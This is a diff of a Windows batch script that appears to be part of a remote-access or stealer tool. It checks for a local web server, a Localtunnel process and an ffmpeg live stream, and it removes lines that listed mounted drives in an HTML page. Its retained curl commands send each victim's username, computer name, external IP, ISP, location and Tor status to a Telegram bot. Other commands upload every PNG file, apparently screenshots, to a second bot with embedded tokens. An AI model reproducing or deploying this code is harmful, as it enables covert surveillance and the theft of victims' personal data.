@@ -69,14 +69,10 @@ for %%f IN (%temporary:~3%/playlist.m3u8) DO (
   set WS=%URI:~0,-1%
 )
 
-
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Off && set "newtemp= ")
 tasklist /fi "imagename eq ffmpeg.exe" | find /i "ffmpeg.exe" > nul
 if not errorlevel 1 (set LS="%WS%!newtemp!") else (set LS="Off")
-
-powershell.exe Remove-Item -Force "C:\index.html"
-FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (echo ^<a href="%WS%%%a"^>%%a^</a^>^<br^> >> C:\index.html))
 
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS% ] [Live Stream: %LS%] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
